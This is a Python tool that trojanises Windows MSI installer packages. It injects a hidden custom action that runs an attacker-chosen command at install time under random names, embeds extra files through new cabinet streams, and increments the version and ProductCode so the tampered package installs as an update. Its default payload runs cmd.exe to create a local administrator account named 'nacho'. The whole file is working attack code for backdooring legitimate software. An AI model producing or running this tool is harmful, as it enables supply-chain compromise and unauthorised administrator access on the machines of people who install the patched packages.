#!/usr/bin/env python3

from cabarchive import CabArchive, CabFile

import logging
import argparse
import shutil
import os
import uuid
import warnings
import subprocess
import tempfile
import random
import string
import csv
import hashlib
import pathlib
import re
import binascii

if os.name == 'nt':
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    import msilib

ACTION_TYPE_JSCRIPT = 6
ACTION_TYPE_FILE = 34
ACTION_TYPE_EXISTING = 50

def random_name(length=12):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def random_hash():
    return hashlib.md5(random_name().encode()).hexdigest().upper()

class MSIPatcher:
    def get_msi_version(self, msi_path):
        raise NotImplementedError

    def increment_msi_version(self, msi_path):
        raise NotImplementedError

    def add_custom_action(self, msi_path, name, type, source, target, sequence):
        raise NotImplementedError

    def add_file(self, msi_path, file_path, component_name, feature_name):
        raise NotImplementedError

class MSIPatcherWindows(MSIPatcher):
    def get_msi_version(self, msi_path):
        db = msilib.OpenDatabase(msi_path, msilib.MSIDBOPEN_READONLY)
        view = db.OpenView("SELECT Value FROM Property WHERE Property='ProductVersion'")
        view.Execute(None)
        result = view.Fetch()
        version = result.GetString(1)
        view.Close()
        db.Close()
        return version

    def increment_msi_version(self, msi_path):
        db = msilib.OpenDatabase(msi_path, msilib.MSIDBOPEN_DIRECT)
        view = db.OpenView("SELECT `Value` FROM `Property` WHERE `Property` = 'ProductVersion'")
        view.Execute(None)   
        record = view.Fetch()

        current_version = None
        new_version = None

        if record:
            current_version = record.GetString(1)
            version = current_version.split('-')[0]
            major, minor, patch = map(int, version.split('.'))
            patch += 1
            if patch == 100:
                minor += 1
                patch = 0
            if minor == 100:
                major += 1
                minor = 0
            new_version = f"{major}.{minor}.{patch}"

            update_view = db.OpenView("UPDATE `Property` SET `Value` = ? WHERE `Property` = 'ProductVersion'")
            update_record = msilib.CreateRecord(1)
            update_record.SetString(1, new_version)
            update_view.Execute(update_record)
            update_view.Close()
            db.Commit()

            new_product_code = '{' + str(uuid.uuid4()).upper() + '}'
            product_code_view = db.OpenView("UPDATE `Property` SET `Value` = ? WHERE `Property` = 'ProductCode'")
            product_code_record = msilib.CreateRecord(1)
            product_code_record.SetString(1, new_product_code)
            product_code_view.Execute(product_code_record)
            product_code_view.Close()
            db.Commit()
            logging.info(f"New ProductCode: {new_product_code}")

            if current_version and new_version:
                logging.info(f"MSI version updated from {current_version} to {new_version}")
        else:
            logging.error("ProductVersion property not found in MSI")

        view.Close()
        db.Close()

    def add_custom_action(self, msi_path, name, type, source, target, sequence):
        db = msilib.OpenDatabase(msi_path, msilib.MSIDBOPEN_DIRECT)

        # Create a property to store the source
        source_key = random_name()
        view = db.OpenView("INSERT INTO `Property` (`Property`, `Value`) VALUES (?, ?)")
        rec = msilib.CreateRecord(2)
        rec.SetString(1, source_key)
        rec.SetString(2, source)
        view.Execute(rec)
        view.Close()

        # Create a new CustomAction record
        ca = db.OpenView("INSERT INTO `CustomAction` "
                        "(`Action`, `Type`, `Source`, `Target`) "
                        "VALUES (?, ?, ?, ?)")
        rec = msilib.CreateRecord(4)

        rec.SetString(1, name)          # Action
        rec.SetInteger(2, type)         # Type
        rec.SetString(3, source_key)    # Source
        if target:
            rec.SetString(4, target)        # Target
        ca.Execute(rec)
        ca.Close()
        db.Commit()

        # Schedule the CustomAction in the appropriate sequence
        seq = db.OpenView("INSERT INTO `" + sequence + "` "
                        "(`Action`, `Condition`, `Sequence`) "
                        "VALUES (?, ?, ?)")

        rec = msilib.CreateRecord(3)
        rec.SetString(1, name)          # Action
        rec.SetString(2, "")            # Condition (probably want to use "NOT Installed")
        rec.SetInteger(3, 1)            # Sequence
        seq.Execute(rec)
        seq.Close()
        db.Commit()

        db.Close()
        return True

    def add_file(self, msi_path, file_path, component_name, feature_name):
        db = msilib.OpenDatabase(msi_path, msilib.MSIDBOPEN_DIRECT)

        file_name = os.path.basename(file_path)
        file_key = f'_{random_hash()}'
        component_key = f'C_{file_key}'
        cab_name = f"_{random_hash()}"

        # Create a new cabinet file
        with tempfile.TemporaryDirectory() as temp_dir:
            cab_path = os.path.join(temp_dir, cab_name)
            self.create_cab_file(file_path, file_key, cab_path)

            # Add cabinet as a stream
            msilib.add_stream(db, cab_name, cab_path)

        # Get the highest existing sequence number from the File table
        max_sequence = 0
        view = db.OpenView("SELECT `Sequence` FROM `File`")
        view.Execute(None)
        while True:
            rec = view.Fetch()
            if not rec:
                break
            sequence = rec.GetInteger(1)
            if sequence > max_sequence:
                max_sequence = sequence
        view.Close()

        new_sequence = max_sequence + 1

        # Add to File table
        file_size = os.path.getsize(file_path)
        view = db.OpenView("INSERT INTO `File` (`File`, `Component_`, `FileName`, `FileSize`, `Version`, `Language`, `Attributes`, `Sequence`) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
        rec = msilib.CreateRecord(8)
        rec.SetString(1, file_key)
        rec.SetString(2, component_key)
        rec.SetString(3, file_name)
        rec.SetInteger(4, file_size)
        rec.SetString(5, '')
        rec.SetString(6, '')
        rec.SetInteger(7, 512)  # Attributes (compressed)
        rec.SetInteger(8, new_sequence)
        view.Execute(rec)
        view.Close()

        # Add to Component table
        view = db.OpenView("INSERT INTO `Component` (`Component`, `ComponentId`, `Directory_`, `Attributes`, `Condition`, `KeyPath`) VALUES (?, ?, ?, ?, ?, ?)")
        rec = msilib.CreateRecord(6)
        rec.SetString(1, component_key)
        rec.SetString(2, '{' + str(uuid.uuid4()).upper() + '}')
        rec.SetString(3, 'TARGETDIR')
        rec.SetInteger(4, 256)    # Attributes
        rec.SetString(5, '')
        rec.SetString(6, file_key)
        view.Execute(rec)
        view.Close()

        # Query the Feature table to get the Feature key
        view = db.OpenView("SELECT `Feature` FROM `Feature`")
        view.Execute(None)
        rec = view.Fetch()
        if not rec:
            feature_key = random_hash()
            view = db.OpenView("INSERT INTO `Feature` (`Feature`, `Feature_Parent`, `Title`, `Description`, `Display`, `Level`, `Directory_`, `Attributes`) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
            rec = msilib.CreateRecord(8)
            rec.SetString(1, feature_key)
            rec.SetString(2, '')
            rec.SetString(3, '')
            rec.SetString(4, '')
            rec.SetInteger(5, 2)
            rec.SetString(6, 1)
            rec.SetString(7, 'TARGETDIR')
            rec.SetInteger(8, 0)
            view.Execute(rec)
        else:   
            feature_key = rec.GetString(1)

        view.Close()

        # Add to FeatureComponents table
        view = db.OpenView("INSERT INTO `FeatureComponents` (`Feature_`, `Component_`) VALUES (?, ?)")
        rec = msilib.CreateRecord(2)
        rec.SetString(1, feature_key)
        rec.SetString(2, component_key)
        view.Execute(rec)
        view.Close()

        # Add new Media entry
        logging.info("Adding new Media entry")
        max_disk_id = 0
        view = db.OpenView("SELECT `DiskId` FROM `Media`")
        view.Execute(None)
        while True:
            rec = view.Fetch()
            if not rec:
                break
            disk_id = rec.GetInteger(1)
            if disk_id > max_disk_id:
                max_disk_id = disk_id
        view.Close()

        logging.info(f"Existing max DiskId: {max_disk_id}")

        new_disk_id = max_disk_id + 1
        logging.info(f"New DiskId: {new_disk_id}")

        view = db.OpenView("INSERT INTO `Media` (`DiskId`, `LastSequence`, `DiskPrompt`, `Cabinet`) VALUES (?, ?, ?, ?)")
        rec = msilib.CreateRecord(4)
        rec.SetInteger(1, new_disk_id)
        rec.SetInteger(2, new_sequence)
        rec.SetString(3, '')
        rec.SetString(4, f'#{cab_name}')
        view.Execute(rec)
        view.Close()

        db.Commit()
        db.Close()

        logging.info(f"Added file to MSI: {file_name}")
        logging.info(f"File key: {file_key}")
        logging.info(f"Component key: {component_key}")
        logging.info(f"Sequence number: {new_sequence}")
        logging.info(f"New Media entry: DiskId {new_disk_id}")
        return True

    @staticmethod
    def create_cab_file(file_path, file_key, output_path):
        file_name = os.path.basename(file_path)
        arc = CabArchive()
        with open(file_path, 'rb') as f:
            arc[file_key] = CabFile(f.read())
        with open(output_path, 'wb') as f:
            f.write(arc.save(True))

class MSIPatcherLinux(MSIPatcher):
    def get_msi_version(self, msi_path):
        with tempfile.TemporaryDirectory() as temp_dir:
            subprocess.run(['msidump', '-d', temp_dir, msi_path], check=True)
            property_file = os.path.join(temp_dir, 'Property.idt')
            with open(property_file, 'r') as f:
                reader = csv.reader(f, delimiter='\t')
                for row in reader:
                    if row[0] == 'ProductVersion':
                        return row[1]
        return None

    def increment_msi_version(self, msi_path):
        with tempfile.TemporaryDirectory() as temp_dir:
            subprocess.run(['msidump', '-d', temp_dir, msi_path], check=True)

            property_file = os.path.join(temp_dir, 'Property.idt')
            updated_property_rows = []
            current_version = None
            new_version = None
            new_product_code = None

            with open(property_file, 'r') as f:
                reader = csv.reader(f, delimiter='\t')
                for row in reader:
                    if row[0] == 'ProductVersion':
                        current_version = row[1]
                        version = current_version.split('-')[0]
                        major, minor, patch = map(int, version.split('.'))
                        patch += 1
                        if patch == 100:
                            minor += 1
                            patch = 0
                        if minor == 100:
                            major += 1
                            minor = 0
                        new_version = f"{major}.{minor}.{patch}"
                        row[1] = new_version
                    elif row[0] == 'ProductCode':
                        new_product_code = '{' + str(uuid.uuid4()).upper() + '}'
                        row[1] = new_product_code
                    updated_property_rows.append(row)

            with open(property_file, 'w', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerows(updated_property_rows)

            subprocess.run(['msibuild', msi_path, '-i', os.path.join(temp_dir, 'Property.idt')], check=True)

        if current_version and new_version:
            logging.info(f"MSI version updated from {current_version} to {new_version}")
        if new_product_code:
            logging.info(f"New ProductCode: {new_product_code}")

    def add_custom_action(self, msi_path, name, type, source, target, sequence):
        with tempfile.TemporaryDirectory() as temp_dir:
            subprocess.run(['msidump', '-d', temp_dir, msi_path], check=True)

            # Create a property to store the source
            source_key = random_name()
            property_file = os.path.join(temp_dir, 'Property.idt')
            with open(property_file, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([source_key, source])

            # Add CustomAction
            custom_action_file = os.path.join(temp_dir, 'CustomAction.idt')
            with open(custom_action_file, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([name, str(type), source_key, target])

            # Add to sequence
            sequence_file = os.path.join(temp_dir, f'{sequence}.idt')
            with open(sequence_file, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([name, '', '1'])

            # Add the property file to the MSI
            subprocess.run(['msibuild', msi_path, 
                            '-i', os.path.join(temp_dir, 'Property.idt')], check=True)

            # Add the custom action to the MSI
            # For some reason the property file needs to be added twice like this
            subprocess.run(['msibuild', msi_path,
                            '-i', os.path.join(temp_dir, 'Property.idt'),
                            '-i', os.path.join(temp_dir, 'CustomAction.idt')], check=True)

            # Add the sequence to the MSI
            subprocess.run(['msibuild', msi_path, 
                            '-i', os.path.join(temp_dir, f'{sequence}.idt')], check=True)
        return True

    def add_file(self, msi_path, file_path, component_name, feature_name):
        with tempfile.TemporaryDirectory() as temp_dir:
            subprocess.run(['msidump', '-d', temp_dir, msi_path], check=True)

            file_name = os.path.basename(file_path)
            file_key = f'_{random_hash()}'
            component_key = f'C_{file_key}'
            cab_name = f"_{random_hash()}"

            # Create a new cabinet file
            cab_path = os.path.join(temp_dir, cab_name)
            self.create_cab_file(file_path, file_key, cab_path)

            # Get the highest existing sequence number from the File table
            file_table = os.path.join(temp_dir, 'File.idt')
            max_sequence = 0
            with open(file_table, 'r') as f:
                reader = csv.reader(f, delimiter='\t')
                # Skip headers
                for _ in range(3):
                    next(reader)
                for row in reader:
                    if row and len(row) > 7 and row[7].isdigit():
                        max_sequence = max(max_sequence, int(row[7]))  # Sequence is the 8th column

            new_sequence = max_sequence + 1

            # Add to File table
            file_size = os.path.getsize(file_path)
            with open(file_table, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([file_key, component_key, file_name, file_size, '', '', 512, new_sequence])

            # Add to Component table
            component_table = os.path.join(temp_dir, 'Component.idt')
            with open(component_table, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([component_key, '{' + str(uuid.uuid4()).upper() + '}', 'TARGETDIR', 256, '', file_key])

            # Query the Feature table to get the Feature key
            feature_table = os.path.join(temp_dir, 'Feature.idt')
            feature_key = None
            with open(feature_table, 'r') as f:
                reader = csv.reader(f, delimiter='\t')
                # Skip headers
                for _ in range(3):
                    next(reader)
                row = next(reader, None)
                if row:
                    feature_key = row[0]
                else:
                    feature_key = random_hash()
                    with open(feature_table, 'a', newline='') as f:
                        writer = csv.writer(f, delimiter='\t')
                        writer.writerow([feature_key, '', '', '', 2, 1, 'TARGETDIR', 0])

            # Add to FeatureComponents table
            feature_components_table = os.path.join(temp_dir, 'FeatureComponents.idt')
            with open(feature_components_table, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([feature_key, component_key])

            # Add new Media entry
            media_table = os.path.join(temp_dir, 'Media.idt')
            new_disk_id = 1
            with open(media_table, 'r') as f:
                reader = csv.reader(f, delimiter='\t')
                # Skip headers
                for _ in range(3):
                    next(reader)
                for row in reader:
                    new_disk_id = max(new_disk_id, int(row[0])) + 1

            with open(media_table, 'a', newline='') as f:
                writer = csv.writer(f, delimiter='\t')
                writer.writerow([new_disk_id, new_sequence, '', f'#{cab_name}', '', ''])

            # Add cabinet file to MSI
            subprocess.run(['msibuild', msi_path, '-a', cab_name, cab_path], check=True)

            # Rebuild MSI with modified tables
            logging.info(f"Rebuilding MSI from: {temp_dir}")
            subprocess.run(['msibuild', msi_path, 
                            '-i', os.path.join(temp_dir, 'File.idt'),
                            '-i', os.path.join(temp_dir, 'Component.idt'),
                            '-i', os.path.join(temp_dir, 'Feature.idt'),
                            '-i', os.path.join(temp_dir, 'FeatureComponents.idt'),
                            '-i', os.path.join(temp_dir, 'Media.idt')], check=True)


        logging.info(f"Added file to MSI: {file_name}")
        logging.info(f"File key: {file_key}")
        logging.info(f"Component key: {component_key}")
        logging.info(f"Sequence number: {new_sequence}")
        logging.info(f"New Media entry: DiskId {new_disk_id}")
        return True

    @staticmethod
    def create_cab_file(file_path, file_key, output_path):
        file_name = os.path.basename(file_path)
        arc = CabArchive()
        with open(file_path, 'rb') as f:
            arc[file_key] = CabFile(f.read())
        with open(output_path, 'wb') as f:
            f.write(arc.save(True))

def get_msi_patcher():
    if os.name == 'nt':
        return MSIPatcherWindows()
    else:
        return MSIPatcherLinux()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", help="Input MSI file to add custom action to", required=True)
    parser.add_argument("-o", "--output", help="Output file to write the patched MSI to", required=True)
    parser.add_argument("-c", "--command", help="Command to inject into MSI, admin user named nacho is " \
                        "added if only -c is specified", required=False, nargs='*')
    parser.add_argument("-f", "--force", help="Delete output file if it exists", action='store_true')
    parser.add_argument("--increment", help="Increment MSI version", action='store_true')
    parser.add_argument("--add-file", help="Path to file to be added to the MSI", required=False)
    parser.add_argument("--feature", help="Feature to add the file to", default="auto")
    args = parser.parse_args()

    if not args.add_file and not args.increment and not type(args.command) == list:
        print("Must specify at least one of --command, --add-file, or --increment")
        exit(1)

    patcher = get_msi_patcher()

    if os.path.exists(args.output):
        if args.force:
            os.remove(args.output)
        else:
            print(f"Output file {args.output} already exists")
            exit(1)

    shutil.copy(args.input, args.output)

    if type(args.command) == list:
        sequence = "InstallExecuteSequence"
        action_type = ACTION_TYPE_EXISTING
        if args.command == []:
            path = "c:\\windows\\system32\\cmd.exe"
            params = "/c net user nacho /add && net localgroup administrators nacho /add && exit 0"
        else:
            segments = pathlib.PureWindowsPath(''.join(args.command)).parts
            if not re.match("^[a-z]:\\\\$", segments[0], re.IGNORECASE):
                print("Must specify full path to the command")
                exit(1)
            path = segments[0] + '\\'.join(segments[1:-1]) + '\\' + segments[-1].split()[0]
            params = ' '.join(segments[-1].split()[1:])
        if patcher.add_custom_action(args.output, f"_{random_hash()}", action_type, path, params, sequence):
            print("Custom action added")

    if args.add_file and patcher.add_file(args.output, args.add_file, random_hash(), args.feature):
        print("File added to MSI")

    if args.increment:
        patcher.increment_msi_version(args.output)
        print("MSI version incremented")

    shutil.rmtree('Binary')
    shutil.rmtree('Icon')